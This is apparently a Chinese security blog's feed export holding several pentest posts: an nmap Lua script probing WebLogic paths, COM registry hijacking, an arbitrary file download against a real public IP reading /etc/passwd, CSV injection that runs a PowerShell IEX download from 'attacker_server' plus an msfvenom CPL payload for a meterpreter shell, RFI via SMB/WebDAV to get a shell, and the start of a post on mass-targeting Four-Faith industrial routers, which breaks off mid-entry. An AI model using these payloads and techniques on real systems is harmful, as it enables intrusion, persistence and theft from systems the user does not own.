      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>nmap有很多自己的脚本，在渗透的时候都能帮上忙，那么如何自己写一个呢？<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1562749002996&amp;di=b9b3b409c2795b275891076ff7d1c944&amp;imgtype=0&amp;src=http%3A%2F%2Fattachments.gfan.com%2Fforum%2Fattachments2%2Fday_120501%2F1205012009f594464a3d69a145.jpg" alt="timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1562749002996&amp;di=b9b3b409c2795b275891076ff7d1c944&amp;imgtype=0&amp;src=http%3A%2F%2Fattachments.gfan.com%2Fforum%2Fattachments2%2Fday_120501%2F1205012009f594464a3d69a145.jpg"></p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><pre><code>nmaplua</code></pre><p>当然你也可以用kali(废话)</p><h2 id="需要学的"><a href="#需要学的" class="headerlink" title="需要学的"></a>需要学的</h2><pre><code>lua基础 -&gt;菜鸟教程   -&gt;基本知识(变量)   -&gt;数据类型   -&gt;函数   -&gt;表   -&gt;数组   -&gt;字符串   -&gt;引入第三方模块   -&gt;文件操作nmap内置API调用-&gt;官方文档  -&gt;nmap脚本的规范  -&gt;内置API如何去使用</code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>参考文章：<br>nmap API手册大全：<br><a href="https://nmap.org/nsedoc/lib/" target="_blank" rel="noopener">https://nmap.org/nsedoc/lib/</a></p><p>Nmap编写自定义脚本的规则：<br><a href="https://nmap.org/book/nse-script-format.html" target="_blank" rel="noopener">https://nmap.org/book/nse-script-format.html</a><br><a href="https://nmap.org/book/nse-tutorial.html#nse-tutorial-rule" target="_blank" rel="noopener">https://nmap.org/book/nse-tutorial.html#nse-tutorial-rule</a></p><p>来自车王的文章：<br><a href="https://zhuanlan.zhihu.com/p/27224457" target="_blank" rel="noopener">Nmap脚本编写 - 知乎</a></p><p>概念图：<br><img src="https://s2.ax1x.com/2019/07/10/ZcnsU0.png" alt="ZcnsU0.png"></p><h2 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h2><p>首先得导入nmap的内置模块<br>PS：你可以看上面的API手册来导入你要导入的lua脚本</p><pre><code class="lua">local http=require &quot;http&quot;local shortport=require &quot;shortport&quot;local stdnse=require &quot;stdnse&quot;local string=require &quot;string&quot;local vulns=require &quot;vulns&quot;</code></pre><p>在漏洞说明里面写点东西<br><img src="https://s2.ax1x.com/2019/07/10/ZcueZn.png" alt="ZcueZn.png"></p><pre><code class="lua">description=[[Grabbing a Site for Subdomain Names]]</code></pre><p>作者信息与脚本分类</p><pre><code class="lua">author=&quot;Jiushi&quot; --作者license=&quot;Same as Nmap--See https://nmap.org/book/man-legal.html&quot; --nmap证书categories={&quot;default&quot;} --脚本的分类</code></pre><p><img src="https://s2.ax1x.com/2019/07/10/ZcusLd.png" alt=""></p><p>规则函数</p><pre><code class="lua">portrule=function(host,port)    set_port=stdnse.get_script_args(&quot;port&quot;) --选择参数    if (type(set_port)~=&quot;nil&quot;) then        local auth_port={number=tonumber(set_port),protocol=&quot;tcp&quot;}        local identd=nmap.get_port_state(host,auth_port)        return identd.number==tonumber(set_port) and identd.state==&quot;open&quot; and port.protocol==&quot;tcp&quot;    endend</code></pre><p><img src="https://s2.ax1x.com/2019/07/10/Zcu7es.png" alt=""><br>PS:portrule函数是在每一个端口运行一次这个脚本，所以用的时候得指定脚本</p><p>行动函数-&gt;action</p><pre><code class="lua">action=function(host,port)    local ht=stdnse.get_script_args(&quot;protocol&quot;)    local path={&quot;/console/login/LoginForm.jsp&quot;,&quot;/wls-wsat/CoordinatorPortType&quot;,&quot;/_async/AsyncResponseService&quot;,&quot;/ws_utc/config.do&quot;,&quot;/uddiexplorer&quot;}    local urls=string.format(&quot;%s://%s&quot;,ht,host[&#39;ip&#39;])    local jiances=jianche(urls,path) --调用一个自定义函数    return jiancesend</code></pre><p><img src="https://s2.ax1x.com/2019/07/10/ZcKa0s.png" alt=""><br>官方写的例子-&gt;</p><pre><code class="lua">action = function(host, port)        local owner = &quot;&quot;        local client_ident = nmap.new_socket()        local client_service = nmap.new_socket()        local catch = function()                client_ident:close()                client_service:close()        end        local try = nmap.new_try(catch)        try(client_ident:connect(host.ip, 113))        try(client_service:connect(host.ip, port.number))        local localip, localport, remoteip, remoteport =                try(client_service:get_info())        local request = port.number .. &quot;, &quot; .. localport .. &quot;\r\n&quot;        try(client_ident:send(request))        owner = try(client_ident:receive_lines(1))        if string.match(owner, &quot;ERROR&quot;) then                 owner = nil        else                owner = string.match(owner,                        &quot;%d+%s*,%s*%d+%s*:%s*USERID%s*:%s*.+%s*:%s*(.+)\r?\n&quot;)        end        try(client_ident:close())        try(client_service:close())        return ownerend</code></pre><p>链接到此文章：<a href="https://nmap.org/book/nse-tutorial.html#nse-tutorial-rule" target="_blank" rel="noopener">传送门</a></p><p>完整代码：</p><pre><code class="lua">--author:jiushi--date:19-7-10--time:早上9:28local http=require &quot;http&quot;local shortport=require &quot;shortport&quot;local stdnse=require &quot;stdnse&quot;local string=require &quot;string&quot;local vulns=require &quot;vulns&quot;description=[[Weblogic path scanning]]--nmap --script=weblogic_query --script-args port=&lt;weblogic_port&gt;,protocol=&lt;http/https&gt; IP--Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-10 12:59 CST--Nmap scan report for 192.168.241.140--Host is up (0.00021s latency).--PORT     STATE SERVICE--7001/tcp open  afs3-callback--| weblogic_query:--|   [200]: http://192.168.241.140:7001/console/login/LoginForm.jsp--|   [200]: http://192.168.241.140:7001/wls-wsat/CoordinatorPortType--|   [200]: http://192.168.241.140:7001/_async/AsyncResponseService--|_  [200]: http://192.168.241.140:7001/uddiexplorer--Nmap done: 1 IP address (1 host up) scanned in 2.45 secondsauthor=&quot;Jiushi&quot;license=&quot;Same as Nmap--See https://nmap.org/book/man-legal.html&quot;categories={&quot;default&quot;}portrule=function(host,port)    set_port=stdnse.get_script_args(&quot;port&quot;)    if (type(set_port)~=&quot;nil&quot;) then        local auth_port={number=tonumber(set_port),protocol=&quot;tcp&quot;}        local identd=nmap.get_port_state(host,auth_port)        return identd.number==tonumber(set_port) and identd.state==&quot;open&quot; and port.protocol==&quot;tcp&quot;    endendfunction jianche(url,path)    local demo={}    local headers={header={}}    headers[&#39;header&#39;][&#39;User-Agent&#39;]=&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&quot;    for p in pairs(path) do        local urls=string.format(&quot;%s:%s%s&quot;,url,set_port,path[p])        local request=http.get_url(urls,headers) --发送get请求，有路径的url得用get_url()请求否则会报错        if (request.status==200 and string.match(request.body,&quot;Not Found&quot;)==nil) then            table.insert(demo,string.format(&quot;[%s]: %s&quot;,request.status,urls))        end    end    return demoendaction=function(host,port)    local ht=stdnse.get_script_args(&quot;protocol&quot;)    local path={&quot;/console/login/LoginForm.jsp&quot;,&quot;/wls-wsat/CoordinatorPortType&quot;,&quot;/_async/AsyncResponseService&quot;,&quot;/ws_utc/config.do&quot;,&quot;/uddiexplorer&quot;}    local urls=string.format(&quot;%s://%s&quot;,ht,host[&#39;ip&#39;])    local jiances=jianche(urls,path)    return jiancesend</code></pre><p>PS:像官方文档中选项之类的东西，得用二维数组来设置<br><img src="https://s2.ax1x.com/2019/07/10/ZcKjAI.png" alt="ZcKjAI.png"></p><p>测试效果：<br><img src="https://s2.ax1x.com/2019/07/10/ZcMavD.png" alt="ZcMavD.png"></p><p><img src="https://s2.ax1x.com/2019/07/10/ZcMcPP.png" alt="ZcMcPP.png"></p><p>动态gif<br><img src="https://s2.ax1x.com/2019/07/10/ZcQtds.gif" alt="ZcQtds.gif"></p><p>END</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>滥用COM注册表结构：CLSID，LocalServer32和InprocServer32学习</title>
      <link href="/posts/d9256889.html"/>
      <url>/posts/d9256889.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天看了一篇：滥用COM注册表结构：CLSID，LocalServer32和InprocServer32进行横向渗透的文章，感觉还不错。决定搞懂这波操作<br><img src="http://f.hiphotos.baidu.com/zhidao/wh%3D680%2C800/sign=6ffc878db8de9c82a630f18954b1ac32/b7003af33a87e950c88e90d81b385343faf2b4ed.jpg" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>供应商包括和/或留下可能被攻击者滥用以进行横向移动，规避，绕过和持久性的注册表，可以导致攻击者进行利用和横向移动</p><pre><code>使用rundll32.exe -sta {CLSID} 可以调用CLSID，rundll只能用于运行dll:rundll32.exe -sta {CLSID}只能在powershell2.0版本或2.0版本上执行</code></pre><p>rundll32不是2.0版本或以上将出现以下错误<br><img src="https://s2.ax1x.com/2019/07/07/Z0jLtg.png" alt=""></p><p>防御手段：卸载程序后，清除注册表里的项值，监视可疑事件（例如：rundll32.exe的使用情况），并实施强大的应用程序白名单（AWL）策略/规则</p><p>枚举所有LocalServer32键值</p><pre><code class="powershell">$inproc = gwmi Win32_COMSetting | ?{ $_.LocalServer32 -ne $null }$inproc | ForEach {$_.LocalServer32} &gt; values.txt```</code></pre><p><img src="https://s2.ax1x.com/2019/07/07/Z0vIC4.png" alt=""></p><p> 枚举所有所有InprocServer32的键值</p><pre><code class="powershell"> $inproc = gwmi Win32_COMSetting | ?{ $_.InprocServer32 -ne $null }$paths = $inproc | ForEach {$_.InprocServer32} &gt; demo.txt</code></pre><p> 根据上面找到的路径，去寻找是否这个二进制文件。如果缺失的话就可以执行利用 关键字：File Not Found</p><p> 自己做的一个小测试：<br>PS：由于没有真实环境，根据上面的ps1代码收集了所有LocalServer32的二进制路径<br>我拿FlashUtil_ActiveX.exe做实验<br><img src="https://s2.ax1x.com/2019/07/07/Z0vzPe.png" alt="Z0vzPe.png"></p><p>由于一开始，这个二进制文件权限是TrustedInstaller所有者，你先将其改为Everyone Allow<br>现在假设缺少这个FlashUtil_ActiveX.exe<br>首先一开始使用get-acl “文件路径” | fl 查看这个二进制文件的路径权限<br><img src="https://s2.ax1x.com/2019/07/07/Z0xFqP.png" alt="Z0xFqP.png"></p><p>由于上面我们进行收集了注册表所有CLSID，现在去HKCU\CLSID里面搜索FlashUtil_ActiveX.exe，后面得到CLSID<br><img src="https://s2.ax1x.com/2019/07/07/Z0xmGQ.png" alt="Z0xmGQ.png"></p><p>我们将calc.exe改名为FlashUtil_ActiveX.exe，然后copy到那个文件路径。<br>然后执行</p><pre><code class="powershell">[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;CLSID&quot;,&quot;IP地址&quot;))</code></pre><p><img src="https://s2.ax1x.com/2019/07/07/Z0xQrq.md.png" alt=""></p><p>即可弹出calc</p><p>如果出下如下图指标画出来的错误，先删除原来copy进行的exe。然后在copy一次在执行即可<br><img src="https://s2.ax1x.com/2019/07/07/Z0xYiF.png" alt="Z0xYiF.png"></p><p>通过上面的ps1代码寻找了localServer32和InprocServer32后，如果有关键File not found的话代表那个CLSID缺少二进制文件或dll</p><p>注意，powershell版本不同，不能远程操作COM （windows7版本，powershell 1.0，无法控制windows 10 powershell版本5.0）</p><p><img src="https://s2.ax1x.com/2019/07/07/Z0xNRJ.png" alt="Z0xNRJ.png"></p><p>滥用注册表COM CSLID与Rundll32<br>根据文章中的说明，执行上面所说的ps1代码，然后寻找缺少的dll的路径，使用get-acl “文件路径” | fl 查看路径的权限<br><img src="https://s2.ax1x.com/2019/07/07/Z0xDZ6.png" alt="Z0xDZ6.png"></p><p>像上图这种，Everyone为文件所有者的话。可以copy一个恶意dll来代替缺少的dll，然后使用rundll32 -sta {CLSID}执行即可<br><img src="https://s2.ax1x.com/2019/07/07/Z0xsIO.png" alt="Z0xsIO.png"></p><p>让我们使用以下命令加载我们的DLL有效载荷与相应的CLSID：</p><pre><code>rundll32.exe -sta {3d09c1ca-2bcc-40b7-b9bb-3f3ec143a87b}</code></pre><p><img src="https://s2.ax1x.com/2019/07/07/Z0xcJe.png" alt="Z0xcJe.png"></p><p>注意：</p><pre><code>HKCU中的CLSID值优先于HKLM中的CLSID值rundll32 -sta{CLSID} 只能是CLSID里的InprocServer32里面的dll调用或者直接使用rundll32调用dll</code></pre>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>COM劫持学习</title>
      <link href="/posts/7dc498ec.html"/>
      <url>/posts/7dc498ec.html</url>
      <content type="html"><![CDATA[<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=35848041&auto=1&height=66"></iframe></p><h3 id="COM组件的来源"><a href="#COM组件的来源" class="headerlink" title="COM组件的来源"></a>COM组件的来源</h3><p>COM component（COM组件）是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。由此带来的好处是多方面的：可以将系统中的组件用新的替换掉，以便随时进行系统的升级和定制；可以在多个应用系统中重复利用同一个组件；可以方便的将应用系统扩展到网络环境下；COM与语言，平台无关的特性使所有的程序员均可充分发挥自己的才智与专长编写组件模块。</p><h3 id="COM组件的方法"><a href="#COM组件的方法" class="headerlink" title="COM组件的方法"></a>COM组件的方法</h3><p>COM是开发软件组件的一种方法。组件实际上是一些小的二进制可执行程序，它们可以给应用程序，操作系统以及其他组件提供服务。开发自定义的COM组件就如同开发动态的，面向对象的API。</p><h3 id="COM组件的规则"><a href="#COM组件的规则" class="headerlink" title="COM组件的规则"></a>COM组件的规则</h3><pre><code>COM组件是以WIN32动态链接库（DLL）或可执行文件（EXE）形式发布的可执行代码组成。COM组件是遵循COM规范编写的COM组件是一些小的二进制可执行文件COM组件可以给应用程序、操作系统以及其他组件提供服务自定义的COM组件可以在运行时刻同其他组件连接起来构成某个应用程序COM组件可以动态的插入或卸出应用COM组件必须是动态链接的COM组件必须隐藏（封装）其内部实现细节COM组件必须将其实现的语言隐藏COM组件必须以二进制的形式发布COM组件必须可以在不妨碍已有用户的情况下被升级COM组件可以透明的在网络上被重新分配位置COM组件按照一种标准的方式来宣布它们的存在</code></pre><p><b>在开送之前先感谢@WBG老哥帮我编辑好的OleView.NET<br>以及一些前辈们的文章：</b><br><a href="https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/" target="_blank" rel="noopener">Lateral Movement via DCOM: Round 2 | enigma0x3</a><br><a href="https://etherdream.github.io/jsproxy/-----https://labs.nettitude.com/blog/com-and-the-powerthief/" target="_blank" rel="noopener">com-and-powerhief</a></p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><pre><code>OS:windows 7exe:Registry,OleView.NET</code></pre><p>Registry下载地址：<br><a href="https://www.lanzous.com/i1vym3g" target="_blank" rel="noopener">Registry</a> 密码：black<br><a href="https://github.com/tyranid/oleviewdotnet" target="_blank" rel="noopener">GitHub - tyranid/oleviewdotnet: A .net OLE/COM viewer and inspector to merge functionality of OleView and Test Container</a></p><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>首先打开Oleview.NET，点击Registry-&gt;APPID （可以看到很多ID）<br><img src="https://s2.ax1x.com/2019/06/21/Zp9E11.md.png" alt="Zp9E11.md.png"></p><p>根据上述的第一篇文章所说的操作，寻找程序启动权限为空的ID，点击：Mode-&gt;Complex，然后配置过滤规则<br><img src="https://s2.ax1x.com/2019/06/21/Zp9mnK.md.png" alt="Zp9mnK.md.png"></p><p>后面我随手点开了一个ID<br><img src="https://s2.ax1x.com/2019/06/21/Zp9QtH.md.png" alt="Zp9QtH.md.png"></p><p>查看一手 （设备启动权限为空）<br><img src="https://s2.ax1x.com/2019/06/21/Zp981I.png" alt="Zp981I.png"></p><p>PS：看下图解释<br><img src="https://s2.ax1x.com/2019/06/21/Zp9Gct.md.png" alt="Zp9Gct.md.png"></p><p>查看CLSID<br><img src="https://s2.ax1x.com/2019/06/21/Zp9NB8.md.png" alt="Zp9NB8.md.png"></p><p>使用Registry定位到CLSID<br><img src="https://s2.ax1x.com/2019/06/21/Zp9scq.md.png" alt="Zp9scq.md.png"></p><p>修改掉这个加载的exe就能完成劫持？（360主体防御拦截警告）<br><img src="https://s2.ax1x.com/2019/06/21/Zp9qHO.md.png" alt="Zp9qHO.md.png"></p><p>根据文章中使用powershell查看COM中可用的操作<br><img src="https://s2.ax1x.com/2019/06/22/ZpFBZV.png" alt="ZpFBZV.png"></p><p>经过搜索发现此COM为自定义COM，无法进行利用<br><img src="https://s2.ax1x.com/2019/06/22/ZpFRMR.md.png" alt="ZpFRMR.md.png"></p><p>常见的COM劫持手法有：</p><pre><code>增加缺少的CLSID进行利用 --- 失败修改原有CLSID加载的程序 --- 失败替换掉CLSID下加载路径的程序 --- 失败</code></pre><p>果然，还是没成功。。。。不过起码学到怎么操作了，如果想复现上述文章作者的操作的话，可以自己试试。COM劫持横向发展也是牛逼…</p><h3 id="使用应用程序快捷方式来劫持DXPServer-exe"><a href="#使用应用程序快捷方式来劫持DXPServer-exe" class="headerlink" title="使用应用程序快捷方式来劫持DXPServer.exe"></a>使用应用程序快捷方式来劫持DXPServer.exe</h3><p><img src="https://s2.ax1x.com/2019/06/22/ZpkALq.md.png" alt="ZpkALq.md.png"><br>添加注册表<br><img src="https://s2.ax1x.com/2019/06/22/ZpkGex.png" alt="ZpkGex.png"></p><p>再次运行，弹出calc<br><img src="https://s2.ax1x.com/2019/06/22/Zpkafe.png" alt="Zpkafe.png"></p><p>我发现：</p><pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths</code></pre><p>这个注册表的路径和镜像劫持的功能一样，但是不会被杀软拦截</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>任意文件下载漏洞学习</title>
      <link href="/posts/71ea52cb.html"/>
      <url>/posts/71ea52cb.html</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=29460167&auto=1&height=66"></iframe><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>任意文件下载漏洞由于在处理下载脚本的时候没有做好对应的一个控制，导致下载文件的参数可控。从而下载其他路径下的文件<br><img src="https://s2.ax1x.com/2019/06/14/V5gSeJ.png" alt="V5gSeJ.png"></p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>上zoomye寻找关键字：download.php?path=<br><img src="https://s2.ax1x.com/2019/06/14/V5giJx.md.png" alt=""></p><p>找到一个<br><img src="https://s2.ax1x.com/2019/06/14/V5gFW6.md.png" alt="V5gFW6.md.png"></p><p>构造url下载</p><pre><code>http://50.62.25.88/download.php?path=index.php</code></pre><p>下载的主页<br><img src="https://s2.ax1x.com/2019/06/14/V5gASK.md.png" alt="V5gASK.md.png"></p><p>下载/etc/passwd</p><pre><code>http://50.62.25.88/download.php?path=../../../../../../etc/passwd</code></pre><p><img src="https://s2.ax1x.com/2019/06/14/V5gQYt.md.png" alt="V5gQYt.md.png"></p><p>读取download.php查看其源码</p><pre><code>&lt;?php    header(&quot;Content-Type: application/octet-stream&quot;);   header(&quot;Content-Disposition: attachment; filename=&quot;.$_GET[&#39;path&#39;]);   readfile($_GET[&#39;path&#39;]);?&gt;</code></pre><p>至此结束…..</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CSV注入绕过杀软获取meterpreter</title>
      <link href="/posts/ebb51b81.html"/>
      <url>/posts/ebb51b81.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在学习CSV注入的时候，有个想法就是能不能执行恶意xls绕过有杀软主机返回meterpreter<br><img src="https://s2.ax1x.com/2019/06/06/Vdcp5T.png" alt=""></p><h2 id="CSV注入"><a href="#CSV注入" class="headerlink" title="CSV注入"></a>CSV注入</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>CSV又称xls注入或excel注入，通过在excel表里面进行操作调用其他进程</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><pre><code>@SUM(1+1)*cmd|&#39; /C calc&#39;!A0=cmd|&#39; /C notepad&#39;!&#39;A1&#39;=cmd|&#39;/C powershell IEX(wget attacker_server/shell.exe)&#39;!A0</code></pre><p>cmd为你要执行的查询可以换成别的，比如说将第一个变成</p><pre><code>@SUM(1+1)*notepad|&#39; demo.txt&#39;!A0</code></pre><p><img src="https://s2.ax1x.com/2019/06/06/VdEzDO.png" alt=""></p><p>当打开xls之后点击信任源就会执行<br><img src="https://s2.ax1x.com/2019/06/06/VdVP5d.png" alt=""></p><h3 id="xls反弹meterpreter"><a href="#xls反弹meterpreter" class="headerlink" title="xls反弹meterpreter"></a>xls反弹meterpreter</h3><p>环境：</p><pre><code>windows server 2008 --- 192.168.241.129 开启了网络共享kali --- 192.168.241.136windows 7 --- 192.168.241.134 安有360服务</code></pre><p>先做一个简单的测试：<br>kali生成一个简单的弹calc的dll,并将dll后缀名改为cpl</p><pre><code>msfvenom -p windows/exec CMD=calc.exe -f dll &gt; hook.dllmv hook.dll hook.cpl</code></pre><p><img src="https://s2.ax1x.com/2019/06/06/VddgIJ.md.png" alt=""></p><p>将这个hook.cpl移到windows server 2008的网络共享里<br><img src="https://s2.ax1x.com/2019/06/06/VddIsK.png" alt=""></p><p>在windows7执行 （发现360并不拦截这个路径，火绒也试过）</p><pre><code>reg add &quot;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cpls&quot; /t REG_SZ /d &quot;\\192.168.241.129\Public\hook.cpl&quot;</code></pre><p><img src="https://s2.ax1x.com/2019/06/06/Vdw5fs.md.png" alt=""></p><p>此时打开控制面板会弹出calc<br><img src="https://s2.ax1x.com/2019/06/06/VdwTlq.md.png" alt=""></p><p>使用Procmon跟踪进程发现控制面板会寻找这个注册表路径并加载里面的cpl<br><img src="https://s2.ax1x.com/2019/06/06/VdwqmT.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/06/06/Vd0Zhd.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/06/06/Vd0n1I.png" alt=""></p><p>远程加载之后我回去windows server 2008发现个事情<br>dll变成了这样，而且一删除就会重新出现= =。。后面问了Yansu才知道怎么回事<br>(PS：如果要删除，先删除目标加里的注册表路径，然后在共享的那台机里重启，重新进入系统后在访问共享删除)<br><img src="https://s2.ax1x.com/2019/06/06/VdB5Mq.png" alt=""></p><p>实验结束，回到上一层话题，使用xls执行cmd命令添加这个注册表路径并执行控制面板获取meterpreter<br>流程大概是这样的：<br><img src="https://s2.ax1x.com/2019/06/06/Vd0y4J.png" alt=""></p><p>生成dll改名为cpl<br><img src="https://s2.ax1x.com/2019/06/06/Vd0jDf.md.png" alt=""></p><p>重新放入hook.cpl<br><img src="https://s2.ax1x.com/2019/06/06/VdDDfJ.md.png" alt=""></p><p>msf开启监听<br><img src="https://s2.ax1x.com/2019/06/06/VdD4te.png" alt=""></p><p>在xls插入以下语句</p><pre><code>=cmd|&#39; /C reg add &quot;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cpls&quot; /t REG_SZ /d &quot;\\192.168.241.129\Public\hook.cpl&quot;&#39;!_xlbgnm.A1</code></pre><p><img src="https://s2.ax1x.com/2019/06/06/Vdr4bV.md.png" alt=""></p><p>打开控制面板触发<br><img src="https://s2.ax1x.com/2019/06/06/VdytOI.png" alt=""></p><p>gif动图<br><img src="https://s2.ax1x.com/2019/06/06/Vd6ucj.gif" alt="Vd6ucj.gif"></p><p>参考文章：<br><a href="http://reverse-tcp.xyz/pentest/red%20team/2017/12/28/windows-to-download-and-execute-arbitrary-code.html" target="_blank" rel="noopener">http://reverse-tcp.xyz/pentest/red%20team/2017/12/28/windows-to-download-and-execute-arbitrary-code.html</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection</a></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RFI绕过限制getshell复现</title>
      <link href="/posts/9b6dafa5.html"/>
      <url>/posts/9b6dafa5.html</url>
      <content type="html"><![CDATA[<h2 id="操作的来源"><a href="#操作的来源" class="headerlink" title="操作的来源"></a>操作的来源</h2><p>在搜东西的时候翻到某篇文章，“RFI绕过限制getshell”。看到了一波奇淫技巧，就复现了一波<br>原文链接：<a href="http://www.freebuf.com/news/203442.html" target="_blank" rel="noopener">RFI绕过URL包含限制getshell</a></p><p><img src="https://s2.ax1x.com/2019/05/31/VlWk1f.png" alt=""></p><p>由于原文有限制，限制如下：</p><pre><code>smb只适用于内网windows特性才能直接访问smb</code></pre><p>之后我在群里看见某位老哥发了张图：<br>（使用Apache搭建webav也行）<br><img src="https://s2.ax1x.com/2019/05/31/VlWRUA.jpg" alt=""></p><h2 id="复现操作"><a href="#复现操作" class="headerlink" title="复现操作"></a>复现操作</h2><p><b>smb绕过</b><br>环境：</p><pre><code>windows：phpstudyLinux：samba,apache</code></pre><p>在www目录下创建一个php(废话)</p><pre><code class="php">&lt;?phpif($_GET[&#39;file&#39;]){    $f=$_GET[&#39;file&#39;];    include &quot;$f&quot;;}?&gt;</code></pre><p>将allow_url_fopen和allow_url_include改为Off，只改allow_url_include为Off也行。因为php.ini默认是这样的<br><img src="https://s2.ax1x.com/2019/05/31/VlWx2V.png" alt=""></p><p>将以下代码保存为sh文件在kali上运行：</p><pre><code class="shell">#/usr/bin/bashecho &quot;[*] install samba...&quot;apt-get install -y sambaecho &quot;[*] setssing smb and setssing smb.conf...&quot;mkdir /var/www/html/pubchmod 0555 /var/www/html/pubchown -R nobody:nogroup /var/www/html/pubwget http://192.168.3.92/rfi/smb.confmv smb.conf /etc/samba/echo &quot;[*] setssing smb.conf success...&quot;echo &quot;[*] start samba&quot;service smbd start</code></pre><p>smb.conf配置文件：</p><pre><code class="shell">[global]workgroup=WORKGROUPserver string=Samba Servernetbios name=indishell-labsecurity=usermap to guest=bad username resolve order=bcast hostdns proxy = nobind interfaces only=yes[ethan]path=/var/www/html/pubwritable=noguest ok=yesguest only=yesread only=yesdirectory mode=0555force user=nobody</code></pre><p>安装完成后，在windows上输入\&lt;Attack_IP&gt;<br><img src="https://s2.ax1x.com/2019/05/31/VlhDmD.png" alt=""></p><p>在ethan文件夹上放入小马<br><img src="https://s2.ax1x.com/2019/05/31/Vlho7Q.md.png" alt=""></p><p>执行以下payload：</p><pre><code>http://127.0.0.1/rfi/rfi.php?file=\\192.168.241.132\ethan\demo.php</code></pre><p><img src="https://s2.ax1x.com/2019/05/31/VlhxnU.png" alt=""></p><p>由于smb，smb里的php不能接受传参。所以只能放大马</p><p><b>apache搭建webav绕过</b><br>前面说到smb绕过有限制，必须在目标机的同个网段或内网里面，目标机必须是windows<br>在Ubuntu下搭建webdav教程：<a href="https://helpcenter.onlyoffice.com/server/community/connect-webdav-server-ubuntu.aspx" target="_blank" rel="noopener">How to create a WebDAV server on Ubuntu and connect it to ONLYOFFICE - ONLYOFFICE</a></p><p>搭建好之后在Linux的文件管理器中输入dav://127.0.0.1/webdav可以看见如下图就代表成功了<br><img src="https://s2.ax1x.com/2019/05/31/Vlqpfe.md.png" alt=""></p><p>执行以下payload：</p><pre><code>http://127.0.0.1/rfi/rfi.php?file=//192.168.241.132//webdav/demo.php</code></pre><p><img src="https://s2.ax1x.com/2019/05/31/VlqAmt.md.png" alt=""></p><h2 id="文件包含漏洞总结"><a href="#文件包含漏洞总结" class="headerlink" title="文件包含漏洞总结"></a>文件包含漏洞总结</h2><p>如图：<br><img src="https://s2.ax1x.com/2019/05/31/VlLxRe.md.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>针对某工业级路由器进行批量</title>
      <link href="/posts/8cc9d20f.html"/>
      <url>/posts/8cc9d20f.html</url>
      <content type="html"><![CDATA[<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul><li>前言</li><li>操作</li><li>结果</li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天上Freebuf看文章的时候，无意间看到篇<br><img src="https://s2.ax1x.com/2019/05/25/Vk6dAI.md.png" alt=""></p><p>看完之后，发现有张图片引起了我的注意<br><img src="https://s2.ax1x.com/2019/05/25/Vk6TvF.md.png" alt=""></p><p>百度了一下：”工业4G路由器大全“发现了图片的来源<br><img src="https://s2.ax1x.com/2019/05/25/VkcKKg.md.png" alt=""></p><p>居然发现了，那肯定得搞搞…</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>看了一下这个公司名，叫“四信”<br><img src="https://s2.ax1x.com/2019/05/25/VkcwqJ.png" alt=""></p><p>打开zoomye搜索了一波“Four-Faith”<br><img src="https://s2.ax1x.com/2019/05/25/VkcfqH.md.png" alt=""></p><p>访问看了一下<br><img src="https://s2.ax1x.com/2019/05/25/VkgAL4.md.png" alt=""></p><p>构造搜索语法：“app:”Four-Faith” +country:”CN” +port:8088 ver:”v2.0.0” +app:”Four-Faith router httpd””<br><img 